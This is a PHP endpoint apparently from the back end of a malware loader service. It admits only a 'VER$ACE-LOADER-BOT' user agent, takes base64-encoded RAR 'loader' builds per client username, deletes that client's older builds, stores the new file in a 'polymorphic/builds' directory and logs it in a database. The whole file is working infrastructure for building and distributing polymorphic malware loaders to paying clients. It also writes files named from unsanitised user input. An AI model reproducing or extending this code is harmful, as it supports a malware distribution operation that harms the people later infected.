<?php
date_default_timezone_set('US/Eastern'); // Set time zone for logging.
ini_set('log_errors', 1);
ini_set('display_errors', 0);

if ($_SERVER['HTTP_USER_AGENT'] != 'VER$ACE-LOADER-BOT') {
    $response = array('status' => 'failed', 'detail' => 'connection error');
    die(json_encode($response));
}

include "../include/config.php"; // SQL Server stuff
include "../include/functions.php";
$server_server = $config['server'];
$server_username = $config['username'];
$server_password = $config['password'];
$server_dbname = $config['dbname'];
$server_status = $config['status'];

try {
    $conn = new PDO('mysql:host=' . $server_server . ';dbname=' . $server_dbname, $server_username, $server_password, [PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]);
} catch (PDOException $e) {
    $response = array('status' => 'failed', 'detail' => 'connection error');
    die(json_encode($response));
}

$file_bytes = str_replace(' ', '+', $_POST["file"]);
$file_bytes = base64_decode($file_bytes);

$username = $_POST["client-username"];
$creation_time = intval($_POST["creation_time"]);
$file_name_to_create = $username . "_loader_" . $creation_time . ".rar";
$file_hash = $_POST["hash"];

log_event($conn, "loader_upload", $username, "loader build created");

$get_prev_ldrs = $conn->prepare("SELECT * FROM loaders WHERE username=:username AND creation_time < :current_creation");
$get_prev_ldrs->bindValue(":username", $username);
$get_prev_ldrs->bindValue(":current_creation", $creation_time);
$get_prev_ldrs->execute();

while($row = $get_prev_ldrs->fetch(PDO::FETCH_ASSOC))
{
    $to_del_path = "builds/" . $row["file_name"];
    if(file_exists($to_del_path))
    {
        unlink($to_del_path);
    }
}

$file_path = "../polymorphic/builds/" . $file_name_to_create;
file_put_contents($file_path, $file_bytes); //create new loader

$add_ldr_to_db = $conn->prepare("INSERT INTO loaders (username, creation_time, file_name, hash) VALUES (:username, :creation_time, :file_name, :hash);");
$add_ldr_to_db->bindValue(":username", $username);
$add_ldr_to_db->bindValue(":creation_time", $creation_time);
$add_ldr_to_db->bindValue(":file_name", $file_name_to_create);
$add_ldr_to_db->bindValue(":hash", $file_hash);
$add_ldr_to_db->execute(); //insert to db
?>